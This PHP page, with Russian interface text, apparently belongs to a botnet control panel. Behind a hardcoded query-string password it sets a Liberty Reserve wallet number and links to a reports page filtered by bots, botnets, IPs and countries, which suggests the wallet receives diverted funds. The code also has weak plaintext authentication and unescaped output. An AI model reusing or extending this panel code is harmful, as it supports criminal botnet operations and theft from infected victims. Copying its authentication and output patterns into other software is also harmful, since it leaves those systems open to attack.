
     <style type="text/css"> html, body {
     background: #deded2; 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}

       </style>
     
  <div align="left" ><img src="images/liberty.jpg" width=240 /></div>
<br>
<?php
$result = ' ';
if($_GET['login']==="libertyforpro")
{

include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
    if(empty($_POST))
	    {
	    
		    if(isset($_GET['ok']))
	            {
		            $result = "Кошелёк обновлен!";	
		        }
		    if(isset($_GET['error']))
	            {
		            $result = "Длина кошелька не верная.";	
		        }
		    $sql_lr = "SELECT `lr` FROM `liberty` WHERE 1";
			$sql_lr_go = mysql_query($sql_lr);
			$lr_array = mysql_fetch_row($sql_lr_go);
			if($lr_array === false )
			    {
				    $lr = "U9999999";
					
				    $pre_lr = "INSERT INTO `liberty` (`lr`) VALUES ('$lr')";
					$pre_lr_go = mysql_query($pre_lr);
				}
			    else
				{
				    $lr = $lr_array[0];
				}


		    $form = "
			         <form method='post' action='lr.php?login=libertyforpro'> 
			      
					<font color='#000000'><b>Номер счёта:</b></font>
					 <input type='text' name='lr' size='15' maxlength='8' value='$lr'>
					 <br><br>
					 <input name='Submit' type=submit size='width:100px' value='Сохранить'>
					 <br>
			         <div><font color='#00000'>$result</font></div>
			         
			         
                     </form>";
                   
			echo $form;
		}
		else
		{		
		    $sql_lr = "SELECT `lr` FROM `liberty` WHERE 1";
			$sql_lr_go = mysql_query($sql_lr);
			$lr_array = mysql_fetch_row($sql_lr_go);
            $lr_do = $lr_array[0];			
		
		 
		    $lr = mysql_real_escape_string($_POST['lr']);
			
			if(strlen($lr) === 8)
			    {
			}
			else
			{
			 header("Location: lr.php?login=libertyforpro&error=1");
			 exit;
			}
			
				
			$up_lr = "UPDATE `liberty` SET `lr`='$lr' WHERE  `lr`='$lr_do'  LIMIT 1;";
			$up_go = mysql_query($up_lr);
			header("Location: lr.php?login=libertyforpro&ok=1");
		}
		
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}

?>
<br>
<div align="left" ><img src="images/libertychk.jpg" width=240 /></div>
<br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $lr; ?>&blt=0" target="blank"><font color='#000000'><b>Check liberty</b></font></a></div>

</body>
</html>
